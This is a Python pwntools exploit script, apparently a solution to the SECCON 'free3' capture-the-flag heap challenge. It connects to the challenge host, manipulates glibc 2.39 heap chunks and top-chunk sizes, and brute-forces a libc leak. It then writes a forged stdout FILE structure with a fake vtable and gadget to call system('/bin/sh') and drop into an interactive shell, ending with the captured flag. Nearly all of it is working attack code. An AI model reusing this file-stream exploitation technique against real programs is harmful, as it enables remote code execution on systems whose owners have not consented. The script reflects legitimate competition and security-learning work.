#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
# tbreak main
dir ./glibc-2.39
# set substitute-path '/build/glibc-CVJwZb/glibc-2.39' './glibc-2.39'

define setbp
    b __printf_buffer_flush_to_file
    b _IO_new_file_finish
    b _IO_new_file_overflow
    b _IO_new_file_underflow
    b __GI__IO_default_uflow
    b __GI__IO_default_pbackfail
    b _IO_new_file_xsputn
    b __GI__IO_file_xsgetn
    b _IO_new_file_seekoff
    b _IO_default_seekpos
    b _IO_new_file_setbuf
    b _IO_new_file_sync
    b __GI__IO_file_doallocate
    b __GI__IO_file_read
    b _IO_new_file_write
    b __GI__IO_file_seek
    b __GI__IO_file_close
    b __GI__IO_file_stat
    b _IO_default_showmanyc
    b _IO_default_imbue
end

continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'free3.seccon.games'
    port = int(args.PORT or 8215)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr

def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


@trace
def alloc(size):
    sla(b'> ', f'1\n{size}'.encode())
    ru(b'ID:',drop=True)
    return int(rl().decode().split(" ")[0], 16)

@trace
def edit(id, content):
    sla(b'> ', f'2\n{id}'.encode())
    sla(b'data(', content)

@trace
def edit_specjalnej_troski(id):
    sla(b'> ', f'2\n{id}'.encode())

@trace
def free(id):
    sla(b'> ', f'3\n{id}'.encode())


SIZE_SZ=8
CHUNK_HDR_SZ=SIZE_SZ*2
MALLOC_ALIGN=0x10
MALLOC_MASK=0xfffffffffffffff0
PAGESIZE=0x1000
PAGE_MASK=0xfff
CHUNK_SIZE_1=0x400
SIZE_1=(CHUNK_SIZE_1-CHUNK_HDR_SZ)
CHUNK_SIZE_3=(PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
SIZE_3=(CHUNK_SIZE_3-CHUNK_HDR_SZ)


c1 = alloc(0x20)
c2 = alloc(0x400)
c4 = alloc(0x200)
free(c1)
free(c2)
top_size = 0x20720
size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
size_2 &= PAGE_MASK
size_2 &= MALLOC_MASK
info(f'size_2 {size_2:#x}')

top = alloc(size_2)
top_size = (top_size-0x10-size_2) & PAGE_MASK
edit(top, flat(
    cyclic(size_2-8),
    p32(top_size + 1)
))

asd = alloc(0x400)
free(top)
free(c4)

# 0x400 [  1]: 0x5ed9453e7bf0 ◂— 0

for _ in range(7):
    c1 = alloc(0x380)
    free(asd)
    c2 = alloc(0x380)
    free(c1)

    top_size = 0x214d0
    size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
    size_2 &= PAGE_MASK
    size_2 &= MALLOC_MASK
    info(f'size_2 {size_2:#x}')

    top = alloc(size_2)
    free(c2)
    top_size = (top_size-0x10-size_2) & PAGE_MASK
    edit(top, flat(
        cyclic(size_2-8),
        p32(top_size + 1)
    ))

    asd = alloc(0x400)
    free(top)


# pwndbg> bins
# tcachebins
# 0x400 [  7]: 0x58a308c1dbf0 —▸ 0x58a308bfbbf0 —▸ 0x58a308bd9bf0 —▸ 0x58a308bb7bf0 —▸ 0x58a308b95bf0 —▸ 0x58a308b73bf0 —▸ 0x58a308b52bf0 ◂— 0
# fastbins
# empty
# unsortedbin
# all: 0x58a308c3fbe0 —▸ 0x740017603b20 (main_arena+96) ◂— 0x58a308c3fbe0

prev = 0
for _ in range(7):
    if prev:
        free(prev)
    prev = alloc(0x400-0x10)

unsorted = alloc(0x100-0x10)
free(asd)
free(prev)

edit(unsorted, p64(0x1337))

for i in range(0x100000000):
    if (i & 0xF000) >> 12 != 0x7:
        continue
    edit_specjalnej_troski(i)
    oracle = rl(timeout=1)
    if b'Not found' in oracle:
        continue
    else:
        ru(b'data(', drop=True)
        libc_leak = ru(b':').removesuffix(b'):').decode()
        libc_leak = int(libc_leak, 10   )
        print(f'{libc_leak:#x}')

        sl(b'A')
        break

libc_leak = i << 32 | libc_leak
kuba = i
info(f'libc: {libc_leak:#x}')
libc.address = libc_leak - 0x203f00

stdout_lock = libc.address + 0x205710   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']

# _IO_wfile_jumps_maybe_mmap
fake_vtable = libc.address + 0x2022e0 + 0x10 - 0x38
gadget = libc.address + 0x000a571f # mov rdi, [rcx+8]; call qword ptr [rcx];

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._lock=u64(b'/bin/sh\x00')
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout          # _wide_data just need to points to empty zone
fake.unknown2= flat(
    0,  # __gconv_step  _codecvt.__cd_in.step.__shlib_handle
    0,
    stdout+0xa8, # _codecvt.__cd_in
    0,
    0,
    gadget, # __gconv_step  _codecvt.__cd_in.step.__gconv_fct __fct
    fake_vtable
)
fake._IO_read_end = libc_leak # avoid calling wdoallocbuf
fake._IO_write_base = stdout + 0x50
fake._IO_write_ptr = stdout + 0x50
fake._IO_write_end = stdout + 0x50
fake._IO_backup_base = libc.sym['system']+27  # align stack
fake._IO_save_end = stdout+0x88

edit(kuba, flat(
    {0x6a0: bytes(fake)}, filler=p64(libc_leak)
))

# __printf_buffer_to_file_switch
# __printf_buffer_flush_to_file
# _IO_sputn
# _IO_new_file_xsputn called first

"""
void
__printf_buffer_to_file_switch (struct __printf_buffer_to_file *buf)
{
  if (buf->fp->_IO_write_ptr < buf->fp->_IO_write_end)
    {
      /* buf->fp has a buffer associated with it, so write directly to
         it from now on.  */
      buf->base.write_ptr = buf->fp->_IO_write_ptr;
      buf->base.write_end = buf->fp->_IO_write_end;
    }
  else
    {
      /* Use the staging area if no buffer is available in buf->fp.  */
      buf->base.write_ptr = buf->stage;
      buf->base.write_end = array_end (buf->stage);
    }

  buf->base.write_base = buf->base.write_ptr;
}

  if (!_IO_need_lock (s))
    {
      struct Xprintf (buffer_to_file) wrap;
      Xprintf (buffer_to_file_init) (&wrap, s);
      Xprintf_buffer (&wrap.base, format, ap, mode_flags);
      return Xprintf (buffer_to_file_done) (&wrap);
    }

    
  __finish = 0x737b59291a30 <_IO_new_file_finish>,
  __overflow = 0x737b59292de0 <_IO_new_file_overflow>,
  __underflow = 0x737b59292630 <_IO_new_file_underflow>,
  __uflow = 0x737b59295590 <__GI__IO_default_uflow>,
  __pbackfail = 0x737b59296dd0 <__GI__IO_default_pbackfail>,
  __xsputn = 0x737b592939d0 <_IO_new_file_xsputn>,
  __xsgetn = 0x737b59293d10 <__GI__IO_file_xsgetn>,
  __seekoff = 0x737b59293150 <_IO_new_file_seekoff>,
  __seekpos = 0x737b59295cb0 <_IO_default_seekpos>,
  __setbuf = 0x737b592923f0 <_IO_new_file_setbuf>,
  __sync = 0x737b59293000 <_IO_new_file_sync>,
  __doallocate = 0x737b59285110 <__GI__IO_file_doallocate>,
  __read = 0x737b592938a0 <__GI__IO_file_read>,
  __write = 0x737b59293930 <_IO_new_file_write>,
  __seek = 0x737b592938c0 <__GI__IO_file_seek>,
  __close = 0x737b59293920 <__GI__IO_file_close>,
  __stat = 0x737b592938d0 <__GI__IO_file_stat>,
  __showmanyc = 0x737b59296f80 <_IO_default_showmanyc>,
  __imbue = 0x737b59296f90 <_IO_default_imbue>


"""

ia()

# SECCON{c4ll1n6_fr33_w17h0u7_fr33}